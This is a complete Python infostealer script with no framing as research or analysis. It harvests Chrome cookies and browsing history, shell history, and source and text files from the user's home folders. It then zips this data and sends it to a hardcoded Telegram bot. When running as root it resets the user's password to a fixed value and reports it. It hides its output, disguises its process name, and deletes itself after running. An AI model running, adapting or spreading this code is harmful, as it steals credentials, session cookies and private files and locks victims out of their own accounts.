import os
import shutil
import subprocess
import signal
import sys
import random
import time
from pathlib import Path
from zipfile import ZipFile
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import contextlib
import requests
import sqlite3
import getpass
import socket
from datetime import datetime

BOT_TOKEN = "8388675908:AAEba2ci8Y3cRxOIIHd0HO5JSpzXncSRj1s"
CHAT_ID = "7807897626"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

collected_files = 0
total_size = 0
TMP_DIR = Path("/tmp/.user-data")
ZIP_PREFIX = Path.cwd() / "user_data_part"
MAX_FILE_SIZE = 10 * 1024 * 1024
MAX_TOTAL_SIZE = 50 * 1024 * 1024
TELEGRAM_MAX_FILE_SIZE = 10 * 1024 * 1024
lock = threading.Lock()

TARGET_EXTENSIONS = {'.js', '.py', '.txt', '.json'}

def install_modules():
    modules = ['requests']
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module, '--quiet'])

def self_destruct():
    try:
        shutil.rmtree(TMP_DIR, ignore_errors=True)
        for zip_file in Path.cwd().glob("user_data_part*.zip"):
            zip_file.unlink(missing_ok=True)
        if Path(__file__).exists():
            os.remove(__file__)
    except:
        pass

def signal_handler(sig, frame):
    try:
        send_data()
    finally:
        self_destruct()
    sys.exit(0)

def get_ipv4():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "Unknown"

def change_password():
    try:
        if os.geteuid() != 0:
            return "Skipped (no root)"
        new_pass = "neyuQ_xD"
        username = getpass.getuser()
        proc = subprocess.run(
            f"echo '{username}:{new_pass}' | sudo -S chpasswd",
            shell=True,
            input=f"{new_pass}\n".encode(),
            capture_output=True
        )
        return new_pass if proc.returncode == 0 else "Failed to change"
    except Exception:
        return "Failed to change"

def collect_browser_data():
    try:
        dest_dir = TMP_DIR / "browser_data"
        dest_dir.mkdir(parents=True, exist_ok=True)
        
        chrome_cookies = Path.home() / ".config/google-chrome/Default/Cookies"
        chrome_history = Path.home() / ".config/google-chrome/Default/History"
        
        if chrome_cookies.exists():
            dest = dest_dir / "chrome_cookies"
            shutil.copy2(chrome_cookies, dest)
            try:
                conn = sqlite3.connect(dest)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                with open(dest_dir / "chrome_cookies.txt", 'w') as f:
                    for row in cursor.fetchall():
                        f.write(f"Host: {row[0]}, Name: {row[1]}, Value: {row[2]}, Encrypted: {row[3].decode('utf-8', errors='ignore')}\n")
                conn.close()
            except Exception:
                pass
        
        if chrome_history.exists():
            dest = dest_dir / "chrome_history"
            shutil.copy2(chrome_history, dest)
            try:
                conn = sqlite3.connect(dest)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls")
                with open(dest_dir / "chrome_history.txt", 'w') as f:
                    for row in cursor.fetchall():
                        f.write(f"URL: {row[0]}, Title: {row[1]}, Last Visit: {row[2]}\n")
                conn.close()
            except Exception:
                pass
    except Exception:
        pass

def collect_terminal_history():
    try:
        dest_dir = TMP_DIR / "terminal_history"
        dest_dir.mkdir(parents=True, exist_ok=True)
        
        history_files = [
            Path.home() / ".bash_history",
            Path.home() / ".zsh_history",
            Path.home() / ".history",
            Path.home() / ".sh_history"
        ]
        
        for src in history_files:
            if src.exists():
                dest = dest_dir / src.name
                shutil.copy2(src, dest)
    except Exception:
        pass

def send_file(zip_path):
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        with open(zip_path, 'rb') as f:
            for _ in range(3):
                try:
                    files = {'document': (zip_path.name, f, 'application/zip')}
                    response = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                        headers=headers,
                        data={'chat_id': CHAT_ID},
                        files=files,
                        timeout=10
                    )
                    if response.status_code == 200:
                        return True
                    time.sleep(1)
                except Exception:
                    time.sleep(1)
        return False
    except Exception:
        return False

def send_data():
    if not any(TMP_DIR.iterdir()):
        return
        
    try:
        ip = get_ipv4()
        new_pass = change_password()
        current_time = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %z")
        message = f"Date: {current_time}\nIPv4: {ip}\nNew Password: {new_pass}"
        
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                headers=headers,
                data={'chat_id': CHAT_ID, 'text': message},
                timeout=10
            )
        except Exception:
            pass
        
        history_file = TMP_DIR / "browser_data" / "chrome_history.txt"
        if history_file.exists():
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                with open(history_file, 'rb') as f:
                    files = {'document': (history_file.name, f, 'text/plain')}
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                        headers=headers,
                        data={'chat_id': CHAT_ID},
                        files=files,
                        timeout=10
                    )
            except Exception:
                pass
        
        info_file = TMP_DIR / "system_info.txt"
        with open(info_file, 'w') as f:
            f.write(message)
        
        files = list(TMP_DIR.rglob("*"))
        if not files:
            return
            
        current_zip = 0
        current_size = 0
        current_files = []
        zip_paths = []
        
        for file in files:
            if file.is_file():
                file_size = file.stat().st_size
                if current_size + file_size > TELEGRAM_MAX_FILE_SIZE and current_files:
                    zip_path = ZIP_PREFIX.with_suffix(f".{current_zip}.zip")
                    with ZipFile(zip_path, 'w') as zipf:
                        for f in current_files:
                            zipf.write(f, f.relative_to(TMP_DIR))
                    zip_paths.append(zip_path)
                    current_zip += 1
                    current_size = 0
                    current_files = []
                current_files.append(file)
                current_size += file_size
        
        if current_files:
            zip_path = ZIP_PREFIX.with_suffix(f".{current_zip}.zip")
            with ZipFile(zip_path, 'w') as zipf:
                for f in current_files:
                    zipf.write(f, f.relative_to(TMP_DIR))
            zip_paths.append(zip_path)
        
        for zip_path in zip_paths:
            send_file(zip_path)
        
    except Exception:
        pass
    finally:
        self_destruct()

def process_file(item, user_dir):
    global collected_files, total_size
    
    if item.is_file() and item.suffix.lower() in TARGET_EXTENSIONS:
        if any("node_modules" in p.lower() for p in item.parts):
            return 0, 0
        try:
            file_size = item.stat().st_size
            if file_size > MAX_FILE_SIZE:
                return 0, 0
                
            with lock:
                if total_size >= MAX_TOTAL_SIZE:
                    return 0, 0
                dest = TMP_DIR / item.relative_to(user_dir)
                dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, dest)
                
                collected_files += 1
                total_size += file_size
                
            time.sleep(random.uniform(0.1, 0.5))
            return 1, file_size
        except Exception:
            return 0, 0
    return 0, 0

def collect_user_data():
    global collected_files, total_size
    
    user_dirs = [
        "~",
        "~/Desktop",
        "~/Documents",
        "~/Downloads",
        "~/Projects",
        "~/Work"
    ]
    
    TMP_DIR.mkdir(parents=True, exist_ok=True)
    
    collect_browser_data()
    collect_terminal_history()
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        for user_dir in user_dirs:
            try:
                dir_path = Path(os.path.expanduser(user_dir))
                if not dir_path.exists():
                    continue
                
                for item in dir_path.rglob("*"):
                    if total_size >= MAX_TOTAL_SIZE:
                        break
                    futures.append(executor.submit(process_file, item, dir_path))
            
            except Exception:
                pass
        
        for future in as_completed(futures):
            if total_size >= MAX_TOTAL_SIZE:
                executor._threads.clear()
                break
            try:
                future.result()
            except Exception:
                pass

def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    with open(os.devnull, 'w') as devnull:
        with contextlib.redirect_stdout(devnull), contextlib.redirect_stderr(devnull):
            install_modules()
            collect_user_data()
            send_data()

if __name__ == "__main__":
    try:
        import ctypes
        libc = ctypes.CDLL(None)
        libc.prctl(15, "python3", 0, 0, 0)
    except:
        pass
        
    main()